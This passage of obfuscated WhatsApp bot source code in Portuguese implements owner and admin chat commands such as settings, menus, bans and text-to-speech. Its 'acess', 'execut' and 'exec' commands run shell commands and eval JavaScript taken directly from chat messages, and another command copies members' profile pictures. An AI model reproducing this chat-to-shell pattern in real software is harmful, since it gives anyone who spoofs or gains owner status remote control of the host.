              fs.writeFileSync("./DADOS/Dono/settings.json", JSON.stringify(setting, null, 2));
              _0x403602("O Nick Do Dono foi configurado para : " + _0x1d6557);
              break;
            case "numero-dono":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x1d6557.match(/[a-z]/i)) {
                return _0x403602("É apenas números..");
              }
              _0x403602("O número dono foi configurado com sucesso para : " + _0x1d6557);
              setting.numerodono = _0x1d6557.trim().replace(new RegExp("[()+-/ +/]", "gi"), "");
              _0x27033e[0] = setting.numerodono;
              numerodn = setting.numerodono;
              numerodono_ofc = setting.numerodono;
              fs.writeFileSync("./DADOS/Dono/settings.json", JSON.stringify(setting, null, 2));
              break;
            case "prefix-bot":
            case "setprefix":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              setting.prefix = _0x1d6557;
              fs.writeFileSync("./DADOS/Dono/settings.json", JSON.stringify(setting, null, 2));
              _0x403602("O prefix foi alterado com sucesso para: " + setting.prefix);
              break;
            case "fotomenu":
            case "fundomenu":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x10f925) {
                return _0x403602("Marque uma imagem");
              }
              if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) && !_0x1d6557.length <= 1) {
                _0x403602("- Calma ae amigo(a), já estou trocando a foto do menu para você..");
                _0xbbe906 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                owgi = await getFileBuffer(_0xbbe906, "image");
                res = await upload(owgi);
                logoslink.logo.splice([]);
                fs.writeFileSync("./DADOS/logos.json", JSON.stringify(logoslink, null, 2));
                setTimeout(() => {
                  logoslink.logo.push(res);
                  fs.writeFileSync("./DADOS/logos.json", JSON.stringify(logoslink, null, 2));
                  _0x403602("A foto do menu foi alterada com sucesso para: " + logoslink.logo);
                }, 1000);
              } else {
                _0x403602("Mande uma imagem com o comando " + (_0x1d93be + _0x3dec88) + " para trocar a foto de todos menu..");
              }
              break;
            case "fundopuxadas":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x10f925) {
                return _0x403602("Marque uma imagem para poder alterar a imagem do menu de Puxadas");
              }
              if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) && !_0x1d6557.length <= 1) {
                _0x403602("- Calma ae amigo(a), já estou trocando a foto do menu de puxadas para você..");
                _0xbbe906 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                owgi = await getFileBuffer(_0xbbe906, "image");
                res = await upload(owgi);
                logoslink.menupuxadas.splice([]);
                fs.writeFileSync("./DADOS/logos.json", JSON.stringify(logoslink, null, 2));
                setTimeout(() => {
                  logoslink.menupuxadas.push(res);
                  fs.writeFileSync("./DADOS/logos.json", JSON.stringify(logoslink, null, 2));
                  _0x403602("A foto do menu de puxadas foi alterada com sucesso para: " + logoslink.menupuxadas);
                }, 1000);
              } else {
                _0x403602("Mande uma imagem com o comando " + (_0x1d93be + _0x3dec88) + " para trocar a foto do menu de puxadas");
              }
              break;
            case "setprefixs":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              _0x1d93be = _0x40e45c[0];
              setting.prefix = _0x1d93be;
              fs.writeFileSync("./DADOS/Dono/settings.json", JSON.stringify(setting, null, 2));
              _0x403602("O prefix foi alterado com sucesso para: " + _0x1d93be);
              break;
            case "nomegp":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              _0x263319.groupUpdateSubject(_0x4f1071, "" + _0x2e320b.slice(9));
              const _0x1d5549 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: "Sucesso, alterou o nome do grupo"
              }, _0x1d5549);
              break;
            case "fotobot":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x10f925) {
                return _0x403602("Envie fotos com legendas " + _0x1d93be + "fotobot ou tags de imagem que já foram enviadas");
              }
              buff = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, "image");
              _0x263319.updateProfilePicture(_0x2dd81a, buff);
              _0x403602("Obrigado pelo novo perfil😗");
              break;
            case "clonar":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602("Você quem é o proprietário?");
              }
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Marque a pessoa que você quer clonar\n\n*EXEMPLO:* clone @");
              }
              if (!_0x5b0a24[0] || _0x5b0a24[1]) {
                return _0x403602("Marque o @ do usuário para roubar a foto do perfil dele, para a do bot..");
              }
              let {
                jid: _0xee38ce,
                id: _0x1b19d6,
                notify: _0x3ec9a3
              } = _0x5b3ba6.find(_0x454b0d => _0x454b0d.id === _0x5b0a24[0]);
              try {
                pp = await _0x263319.profilePictureUrl(_0x1b19d6, "image");
                buxeta = await getBuffer(pp);
                _0x263319.updateProfilePicture(_0x2dd81a, buxeta);
                _0xd7aa55("Foto do perfil atualizada com sucesso, usando a foto do perfil @" + _0x1b19d6.split("@")[0], [_0x1b19d6], true);
              } catch (_0x531bc9) {
                _0x403602("Deu erro seu porrinha");
              }
              break;
            case "envmsg":
              if (!_0x2a5ff3 && !_0x35021e) {
                return;
              }
              var [_0xa398c1, _0x50807c] = _0x1d6557.split("/");
              const _0x41ba47 = {
                text: _0x50807c
              };
              _0x263319.sendMessage(_0xa398c1, _0x41ba47);
              break;
            case "bcgp":
            case "bcgc":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x1d6557) {
                return _0x403602("Cade o texto?");
              }
              var _0x3dfd74 = _0x302296.participant;
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                encmedia = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, "image");
                for (_0xc3d45a = 0; _0xc3d45a < _0x5b3ba6.length; _0xc3d45a++) {
                  await sleep(2000);
                  const _0x1665c7 = {
                    image: buff
                  };
                  _0x263319.sendMessage(_0x5b3ba6[_0xc3d45a].id, _0x1665c7, {
                    caption: "*「 TRANSMISSÃO 」*\n\nGrupo: " + _0x471350 + "\n Número: wa.me/" + _0x32e455.split("@")[0] + "\nMensagem : " + _0x2e320b.slice(6)
                  });
                }
                _0x403602("Transmissão enviada..");
              } else {
                for (_0xc3d45a = 0; _0xc3d45a < _0x5b3ba6.length; _0xc3d45a++) {
                  await sleep(2000);
                  _0x56cb1a(_0x5b3ba6[_0xc3d45a].id, "*「 TRANSMISSÃO 」*\n\nGrupo : " + _0x471350 + "\n Número : wa.me/" + _0x32e455.split("@")[0] + "\nMensagem : " + _0x2e320b.slice(6));
                }
                _0x403602("Grupo de transmissão bem-sucedido");
              }
              break;
            case "dono1":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              nescessario.dono1 = _0x1d6557.trim();
              dono1 = nescessario.dono1;
              _0x130557(nescessario);
              _0x403602("Agora contem um segundo dono(a) alterado com sucesso para: " + _0x1d6557);
              break;
            case "dono2":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              nescessario.dono2 = _0x1d6557.trim();
              dono2 = nescessario.dono2;
              _0x130557(nescessario);
              _0x403602("Agora contem um segundo dono(a) alterado com sucesso para: " + dono2);
              break;
            case "dono3":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              nescessario.dono3 = _0x1d6557.trim();
              dono3 = nescessario.dono3;
              _0x130557(nescessario);
              _0x403602("Agora contem um terceiro dono(a) alterado com sucesso para: " + dono3);
              break;
            case "dono4":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              nescessario.dono4 = _0x1d6557.trim();
              dono4 = nescessario.dono4;
              _0x130557(nescessario);
              _0x403602("Agora contem um quarto dono(a) alterado com sucesso para: " + dono4);
              break;
            case "dono5":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              nescessario.dono5 = _0x1d6557.trim();
              dono5 = nescessario.dono5;
              _0x130557(nescessario);
              _0x403602("Agora contem um quinto dono(a) alterado com sucesso para: " + dono5);
              break;
            case "dono6":
              if (_0x40e45c.length < 1) {
                return;
              }
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              nescessario.dono6 = _0x1d6557.trim();
              dono6 = nescessario.dono6;
              _0x130557(nescessario);
              _0x403602("Agora contem um quinto dono(a) alterado com sucesso para: " + dono6);
              break;
            case "getquoted":
              _0x403602(JSON.stringify(_0x302296.message.extendedTextMessage.contextInfo, null, 3));
              break;
            case "donos":
              p = "[ Lista de donos do bot " + NomeDoBot + " ] \n\nDono Oficial do bot: " + numerodono_ofc + "\n\n- [ 1 ] " + dono1 + "\n- [ 2 ] " + dono2 + "\n- [ 3 ] " + dono3 + "\n- [ 4 ] " + dono4 + "\n- [ 5 ] " + dono5 + "\n- [ 6 ] " + dono6;
              _0x403602(p);
              break;
            case "admins":
            case "listadmins":
            case "listaadmins":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              ytb = "Lista de admins do grupo *" + _0xf7f183.subject + "*\nTotal : " + _0x2aa963.length + "\n\n";
              no = 0;
              for (let _0x4fe7fc of _0x2aa963) {
                no += 1;
                ytb += "[" + no.toString() + "] @" + _0x4fe7fc.split("@")[0] + "\n";
              }
              _0xd7aa55(ytb, _0x2aa963, true);
              break;
            case "criartabela":
            case "criartbl":
            case "criartab":
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602("Só adm ou dono pode utilizar este comando.");
              }
              if (!_0x1d6557.trim()) {
                return _0x403602("Digite o que deseja colocar na tabela do grupo..");
              }
              msgz = _0x40e45c.join(" ");
              msgtmpol = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
              datinhaofc = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
              const _0x20e2ef = {
                Horario: msgtmpol,
                Data: datinhaofc,
                Tabela: msgz
              };
              fs.writeFileSync("./DADOS/tabela/tabela-" + _0x4f1071 + ".json", JSON.stringify(_0x20e2ef, null, 2));
              _0x403602("Tabela do grupo foi criada com sucesso..");
              break;
            case "tabelagp":
            case "tabeladogp":
            case "tabelinha":
              if (!fs.existsSync("./DADOS/tabela/tabela-" + _0x4f1071 + ".json")) {
                _0x403602("Cade a tabela, cria ela com o comando\nExemplo : " + _0x1d93be + "criartabela lindas do grupo : e etc ..");
              }
              const _0x1d0368 = JSON.parse(fs.readFileSync("./DADOS/tabela/tabela-" + _0x4f1071 + ".json"));
              blity = "- ⏰ Horário que criou a Tabela : " + _0x1d0368.Horario + "\n\n- 🗓️ Data que criou a Tabela : " + _0x1d0368.Data + "\n\n - Tabela : " + _0x1d0368.Tabela;
              _0x5b6fe5(blity);
              break;
            case "ativo":
            case "on":
            case "voltei":
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602("Comando apenas para administradores ou dono..");
              }
              if (_0x1471ff) {
                if (fs.existsSync("./DADOS/afk/afk-@" + numerodono_ofc + ".json")) {
                  DLT_FL("./DADOS/afk/afk-@" + numerodono_ofc + ".json");
                  _0x403602("Bem vindo de volta, agora você está online 🙂");
                } else {
                  _0x403602("Você não registrou nenhuma mensagem de ausência...");
                }
              } else if (_0x150e9e) {
                if (!JSON.stringify(_0x3bd584[0].ausentes).includes(_0x32e455)) {
                  return _0x403602("Não há nenhum registro de ausência sua..");
                }
                _0x3bd584[0].ausentes.splice(_0x3bd584[0].ausentes.map(_0x454da3 => _0x454da3.id).indexOf(_0x32e455), 1);
                _0x33e29e(_0x3bd584);
                _0x403602("Registro de ausência tirada com sucesso...");
              }
              break;
            case "ausente":
            case "off":
            case "afk":
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602("Comando apenas para administradores ou dono..");
              }
              if (_0x1471ff) {
                msgtmp = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
                const _0x314f66 = {
                  Ausente_Desde: msgtmp,
                  Motivo_Da_Ausência: _0x1d6557
                };
                fs.writeFileSync("./DADOS/afk/afk-@" + setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + ".json", JSON.stringify(_0x314f66, null, 2));
                _0x403602("Mensagem de ausência criada com sucesso...");
              } else if (_0x150e9e) {
                if (!_0x1d6557.trim()) {
                  return _0x403602("Digite a mensagem de ausência, Exemplo: " + (_0x1d93be + _0x3dec88) + " Estou tomando banho");
                }
                if (!JSON.stringify(_0x3bd584[0].ausentes).includes(_0x32e455)) {
                  _0x3bd584[0].ausentes.push({
                    id: _0x32e455,
                    msg: _0x1d6557.trim()
                  });
                  _0x33e29e(_0x3bd584);
                  _0x403602("Mensagem de ausência criada com sucesso..\n\nSe deseja Desativar a mensagem de ausência use o comando ativo");
                } else {
                  _0x3bd584[0].ausentes[_0x3bd584[0].ausentes.map(_0x1742ff => _0x1742ff.id).indexOf(_0x32e455)].msg = _0x1d6557.trim();
                  _0x33e29e(_0x3bd584);
                  _0x403602("Mensagem de ausência alterada com sucesso..\n\nSe deseja Desativar a mensagem de ausência use o comando ativo");
                }
              } else {
                return _0x403602("Comando apenas para administradores e dono do bot..");
              }
              break;
            case "reagir":
              const _0x2185a6 = {
                text: "💖",
                key: _0x302296.key
              };
              const _0x1b3448 = {
                react: _0x2185a6
              };
              const _0x589205 = _0x1b3448;
              _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x589205);
              break;
            case "iniciar_o_jogo":
              if (jogo_iniciado) {
                return _0x403602("o jogo já foi iniciado, aguarde terminar..");
              }
              _0xd7aa55("- " + _0x6965b0 + " Atenção a todos do grupo, o Usuário @" + _0x32e455.split("@")[0] + " iniciou o jogo ", _0x32e455);
              break;
            case "limpar":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              clear = "🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅";
              const _0x5949ab = {
                text: clear
              };
              const _0x38b195 = {
                forwardingScore: 500,
                isForwarded: true
              };
              const _0x3bd93f = {
                quoted: _0xa6b34,
                contextInfo: _0x38b195
              };
              _0x263319.sendMessage(_0x4f1071, _0x5949ab, _0x3bd93f);
              break;
            case "d_":
              if (!_0x38b1b5) {
                return _0x403602("Apenas premium..");
              }
              _0x263319.sendMessage(_0x4f1071, {
                delete: {
                  remoteJid: _0x4f1071,
                  fromMe: false,
                  id: _0x302296.message.buttonsResponseMessage.contextInfo.stanzaId,
                  participant: _0x2dd81a
                }
              });
              break;
            case "deletar":
            case "delete":
            case "del":
            case "d":
              if (!_0x150e9e && !_0x35021e && !_0x38b1b5) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5d6558) {
                return _0x403602("Marque a mensagem do usuário que deseja apagar, do bot ou de alguém..");
              }
              _0x263319.sendMessage(_0x4f1071, {
                delete: {
                  remoteJid: _0x4f1071,
                  fromMe: false,
                  id: _0x302296.message.extendedTextMessage.contextInfo.stanzaId,
                  participant: _0x5d6558
                }
              });
              break;
            case "fundobemvindo":
            case "fundobv":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x10f925) {
                return _0x403602("Marque uma imagem");
              }
              _0x403602("Você deve marcar uma imagem com esse comando, se não for de primeira, tente novamente, ok? ");
              if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925 || _0x5760e9) && !_0x1d6557.length <= 1) {
                _0xbbe906 = _0x10f925 || _0x5760e9 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296;
                owgi = await getFileBuffer(_0xbbe906, "image");
                res = await upload(owgi);
                fundo1 = res;
                nescessario.fundo1 = fundo1;
                _0x130557(nescessario);
                _0x403602("A imagem de bem vindo foi alterado com sucesso para: " + fundo1);
              }
              break;
            case "fundosaiu":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x10f925) {
                return _0x403602("Marque uma imagem");
              }
              _0x403602("Você deve marcar uma imagem com esse comando, se não for de primeira, tente novamente, ok? ");
              if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925 || _0x5760e9) && !_0x1d6557.length <= 1) {
                _0xbbe906 = _0x10f925 || _0x5760e9 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296;
                owgi = await getFileBuffer(_0xbbe906, "image");
                res = await upload(owgi);
                fundo2 = res;
                nescessario.fundo2 = fundo2;
                _0x130557(nescessario);
                _0x403602("A imagem de saiu foi alterado com sucesso para: " + fundo2);
              }
              break;
            case "antiligar":
            case "antiligacao":
            case "antiligação":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x2ea32a) {
                nescessario.anticall = true;
                _0x130557(nescessario);
                _0x403602("Ativando anti ligação para o bot...\ncaso liguem para o bot serão bloqueado..");
              } else if (_0x2ea32a) {
                nescessario.anticall = false;
                _0x130557(nescessario);
                _0x403602("Desativando anti ligação para o bot...");
              }
              break;
            case "antipv":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x2129b6) {
                nescessario.antipv = true;
                _0x130557(nescessario);
                _0x403602("Ativando anti privado para o bot...\ncaso mandem mensagem para o bot serão bloqueado..");
              } else if (_0x2129b6) {
                nescessario.antipv = false;
                _0x130557(nescessario);
                _0x403602("Desativando anti privado para o bot...");
              }
              break;
            case "antipv2":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x5346a2) {
                nescessario.banChats = true;
                _0x130557(nescessario);
                _0x403602("*Sucesso alterado para modo antipv, pv não poderá ser utilizado, mas não bloquearei, só flodarei mensagem a cada mensagem dele..");
              } else if (_0x5346a2) {
                nescessario.banChats = false;
                _0x130557(nescessario);
                _0x403602("*Sucesso modo antipv desligado, pv liberado.");
              }
              break;
            case "antipv3":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x2ae91c) {
                nescessario.antipv3 = true;
                _0x130557(nescessario);
                _0x403602("Antipv3 ativado com sucesso, irei ignorar todas as mensagens recebidas no pv, exceto: donos e usuários premium..");
              } else if (_0x2ae91c) {
                nescessario.antipv3 = false;
                _0x130557(nescessario);
                _0x403602("Antipv3 desativado com sucesso, agora responderei todos sem preferência!");
              }
              break;
            case "block":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557.length > 6) {
                return _0x403602("Marque o @ do usuário que deseja bloquear de ele utilizar os comandos, ou o número da fórma que copiar...");
              }
              var _0x1a9d9a = _0x1d6557.replace(new RegExp("[()+-/ @+/]", "gi"), "") + "@s.whatsapp.net";
              var _0x3105c5 = ban.indexOf(_0x1a9d9a);
              if (_0x3105c5 >= 0) {
                return _0x403602("*Esse Número ja esta incluso*");
              }
              ban.push(_0x1a9d9a);
              fs.writeFileSync("./DADOS/usuarios/banned.json", JSON.stringify(ban));
              susp = "🚫@" + _0x1a9d9a.split("@")[0] + " foi banido e não poderá mais usar os comandos do bot🚫";
              const _0x4de21f = {
                text: susp,
                mentions: [_0x1a9d9a]
              };
              _0x263319.sendMessage(_0x4f1071, _0x4de21f);
              break;
            case "unblock":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557.length > 6) {
                return _0x403602("Marque o @ do usuário que deseja desbloquear pra ele utilizar os comandos, ou o número da fórma que copiar...");
              }
              var _0x1a9d9a = _0x1d6557.replace(new RegExp("[()+-/ @+/]", "gi"), "") + "@s.whatsapp.net";
              var _0x286b57 = ban.indexOf(_0x1a9d9a);
              if (_0x286b57 < 0) {
                return _0x403602("*Esse número não está incluso*");
              }
              pesquisar = _0x1a9d9a;
              processo = ban.indexOf(pesquisar);
              while (processo >= 0) {
                ban.splice(processo, 1);
                processo = ban.indexOf(pesquisar);
              }
              fs.writeFileSync("./DADOS/usuarios/banned.json", JSON.stringify(ban));
              susp = "@" + _0x1a9d9a.split("@")[0] + " foi desbanido e poderá novamente usar os comandos do bot❎";
              const _0x5bb839 = {
                text: susp,
                mentions: [_0x1a9d9a]
              };
              _0x263319.sendMessage(_0x4f1071, _0x5bb839);
              break;
            case "blocklist":
              jrc = "ESTA É A LISTA DE NÚMEROS BLOQUEADOS :\n";
              for (let _0x13c761 of ban) {
                jrc += "~> @" + _0x13c761.split("@")[0] + "\n";
              }
              jrc += "Total : " + ban.length;
              _0x263319.sendMessage(_0x4f1071, {
                text: jrc.trim(),
                mentions: ban
              });
              break;
            case "acess":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              teks = _0x2e320b.slice(7);
              exec(teks, (_0x4351a, _0x17f28a) => {
                const _0x3cbe21 = {
                  quoted: _0x302296
                };
                if (_0x4351a) {
                  return _0x263319.sendMessage(_0x4f1071, {
                    text: "Xbot:~ " + _0x4351a
                  }, _0x3cbe21);
                }
                if (_0x17f28a) {
                  const _0x311ae0 = {
                    text: _0x17f28a
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x311ae0);
                }
              });
              break;
            case "execut":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return;
              }
              try {
                return eval("(async() => { " + _0x40e45c.join(" ") + "})()");
              } catch (_0xa282da) {
                const _0x25b713 = {
                  text: "" + _0xa282da
                };
                _0x263319.sendMessage(_0x4f1071, _0x25b713);
              }
              break;
            case "exec":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return;
              }
              try {
                paramsQuoted = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.conversation || _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;
                return eval("" + paramsQuoted);
                console.log("[EXEC]~> " + paramsQuoted);
              } catch (_0x2c6e81) {
                _0x403602(_0x2c6e81);
              }
              break;
            case "sender":
              bla = _0xd20756 ? _0x302296.key.participant : _0x302296.key.remoteJid;
              _0x403602(bla);
              break;
            case "ping":
              const _0x451fe0 = require("os");
              const _0x4b213b = _0x451fe0.cpus().map((_0x8a9231, _0x742918) => {
                _0x8a9231.total = Object.keys(_0x8a9231.times).reduce((_0xca88fd, _0x5cb8fc) => _0xca88fd + _0x8a9231.times[_0x5cb8fc], 0);
                return {
                  ..._0x8a9231,
                  index: _0x742918 + 1
                };
              });
              function _0x14617b(_0x5e6837) {
                return _0x5e6837.toLocaleString();
              }
              const _0x445125 = Date.now() / 1000 - _0x302296.messageTimestamp;
              const _0x5ba7f2 = process.uptime();
              var _0x2b89ea = await _0x263319.groupFetchAllParticipating();
              var _0xe96608 = Object.entries(_0x2b89ea).slice(0).map(_0xbb11f0 => _0xbb11f0[1]);
              const _0x50b18f = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
              const _0x132e77 = _0x4b213b.length > 0 ? _0x4b213b[0].model.trim() : "Unknown";
              const _0x3babd6 = _0x4b213b.length > 0 ? _0x4b213b[0].speed : 0;
              let _0x36a92f = _0x4b213b.map(_0x532c58 => {
                return "|  ͢   *Núcleo " + _0x532c58.index + "*:\n|  ͢   *Modelo: " + _0x532c58.model.trim() + "*\n|  ͢   *Velocidade: " + _0x532c58.speed + " MHz*\n|  ͢   *Total: " + _0x532c58.total + "*";
              }).join("\n\n");
              const _0x570b35 = "\n━━━━┉┉┉┅┅┅┅┉┉┉━━━━\n|\n|  ू ፝͜❥ " + _0x6965b0 + " @" + _0x32e455.split("@")[0] + " \n|\n|  *O Bot se encontra online por:*\n| \n|  ͢   " + kyun(_0x5ba7f2) + "\n|\n|  ͢   *Velocidade de Resposta:* " + String(_0x445125.toFixed(3)) + "\n|\n|  ͢   *Funcionando em: " + _0xe96608.length + " Grupos*\n|\n|  ͢   *Hospedado em: " + _0x451fe0.type() + "*\n|\n|  ͢   *Total de RAM Disponível: " + (_0x451fe0.totalmem() / 1073741824).toFixed(2) + " GB*\n|\n|  ͢   *RAM Usada Pelo Bot: " + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + " MB*\n|\n|  ͢   *Versão do Sistema Operacional: " + _0x451fe0.version() + "*\n|\n|  ͢   *Núcleos*\n|." + lermais + "\n|      " + _0x36a92f + "\n|\n|  ͢   *Arquitetura da CPU: " + _0x451fe0.arch() + "*\n|\n━━━━┉┉┉┅┅┅┅┉┉┉━━━━";
              const _0x15d227 = {
                text: _0x570b35,
                mentions: [_0x32e455]
              };
              const _0x2b3143 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x15d227, _0x2b3143);
              break;
            case "gtts":
            case "falar":
              try {
                const _0x3709a9 = {
                  text: "Cade o texto?, digite algo Exemplo:\n" + _0x1d93be + "gtts PT Oi"
                };
                const _0x756606 = {
                  quoted: _0x302296
                };
                if (_0x40e45c.length < 1) {
                  return _0x263319.sendMessage(_0x4f1071, _0x3709a9, _0x756606);
                }
                const _0x146cba = require("./armor/funcoes/gtts")(_0x40e45c[0]);
                const _0x45f5b2 = {
                  quoted: _0x302296
                };
                if (_0x40e45c.length < 2) {
                  return _0x263319.sendMessage(_0x4f1071, {
                    text: "Falta colocar o código do idioma!"
                  }, _0x45f5b2);
                }
                dtt = _0x2e320b.slice(8);
                ranm = getRandom(".mp3");
                rano = getRandom(".ogg");
                if (dtt.length > 200) {
                  return _0x403602("Para reduzir spam o máximo de letras permitidas são 200!");
                }
                setTimeout(() => {
                  _0x263319.sendPresenceUpdate("recording", _0x4f1071);
                }, 3000);
                _0x146cba.save(ranm, dtt, function () {
                  exec("ffmpeg -i " + ranm + " -ar 48000 -vn -c:a libopus " + rano, _0x4eb6fc => {
                    const _0x1b7b75 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      audio: fs.readFileSync(ranm),
                      ptt: true,
                      mimetype: "audio/mp4"
                    }, _0x1b7b75).catch(_0x27f82f => {
                      return _0x403602("" + infoerror);
                    });
                    DLT_FL(ranm);
                    DLT_FL(rano);
                  });
                });
              } catch {
                return _0x403602("" + infoerror);
              }
              break;
            case "tagme":
              const _0xcc8a1b = "@" + _0x32e455.split("@")[0] + " ✔️";
              await _0xd7aa55(_0xcc8a1b, [_0x32e455], true);
              break;
            case "blockcmd":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              tp = _0x40e45c.join(" ");
              if (tp.includes("blockcmd blockcmd") || tp.includes("blockcmd  blockcmd")) {
                return _0x403602("Tá louco maluco?, Quer banir o comando de bloquear comando?");
              }
              if (getComandoBlock(_0x4f1071).includes(_0x40e45c[0])) {
                return _0x403602("Este comando já está blockeado");
              }
              addComandos(_0x4f1071, _0x40e45c[0]);
              _0x403602("O comando " + _0x40e45c[0] + " Foi blockeado");
              break;
            case "unblockcmd":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              tp = _0x40e45c.join(" ");
              if (tp.includes("blockcmd unblockcmd") || tp.includes("blockcmd  unblockcmd")) {
